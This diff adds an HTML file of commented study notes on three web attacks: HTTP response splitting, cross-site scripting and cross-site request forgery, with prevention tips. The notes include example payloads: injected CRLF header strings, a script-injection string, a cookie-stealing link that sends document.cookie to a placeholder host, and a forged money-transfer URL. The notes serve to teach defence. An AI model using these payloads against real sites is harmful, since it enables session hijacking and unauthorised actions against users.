@@ -1,0 +1,53 @@
+<!--
+ * Re-Submit
+ * 
+-->
+
+<!--
+ * HTTP response splitting (CRLF Injection)
+ * @see https://en.wikipedia.org/wiki/HTTP_response_splitting
+ *  forgery http header CRLF(\r\n) in Set-Cookie or Location
+ *  cookie('name', "Aaron Script\r\nContent-length:13123Connection:Close\r\n<html>\r\n<body>\r\nHello Aaron Script</body></html>");
+ *  or
+ *  Location: http://127.0.0.1/?name=AaronScript\r\nConnection:CLose\r\n<html>\r\n<body>\r\nHello Aaron Script\r\n</body></html>
+ *  Prevention:
+ *    filter character CRLF
+ * @note Per the HTTP standard, headers are separated by one CR(carriage return, 0x0D \r) and LF(line feed, 0x0A, \n)
+ *  HTTP/1.1 302 Moved Temporarily\r\n
+ *  Location: http://127.0.0.1/?name=AaronScript\r\n
+ *  Content-Type: text/html\r\n
+ *  Set-Cookie: PHPSESSID=AaronScript-Is-A-Good-Boy; path=\r\n
+ *  Content-length:12131232
+ *  Connection: CLose\r\n
+ *  <html>...html here...</html>
+ -->
+
+
+<!--
+ * XSS (Cross-Site Scripting)
+ * @see https://en.wikipedia.org/wiki/Cross-site_scripting
+ * @example
+ *   POST/GET  
+ *    run dangerous script: 
+ *      text=<script%20src="http://...js">
+ *    get session id or cookie: 
+ *      text=<a href="#" onclick="document.location='http://.../?cookie=' + escape(document.cookie);">Click Me</a>        
+ -->
+
+
+<!--
+ * CSRF (Cross-Site Request Forgery)
+ * @see https://en.wikipedia.org/wiki/Cross-site_request_forgery
+ *  [Hacked Site] lets [User](who is right at login status with cookies of [Site B])
+ *    to visit an actor url(e.g. site_b/transfer_money?to=AaronScript&amount=1000000000 or [Hacked Site] forges a POST iframe) of [Site B].
+ *  Coz the url is visited by [User] that makes [Site B] has to handle it.
+ * Analyse:
+ *  [Site B] replies on [User]'s identity
+ *  [Hacked Site] tricks [User]'s browser into sending HTTP requests
+ * Prevention:
+ *  Synchronizer token pattern:
+ *    <input name="csrf_token" value="*RANDOM*TOKEN*SessionIDIsSuggest">
+ *  Cookie-to-Header Token:     // suggest using session id
+ *    Set-Cookie: csrf_token=xslkdjflsafdsklfsadfkdsafsaff;
+ * @note Mostly, any a third party website can't approch the cookie of another.
+ -->
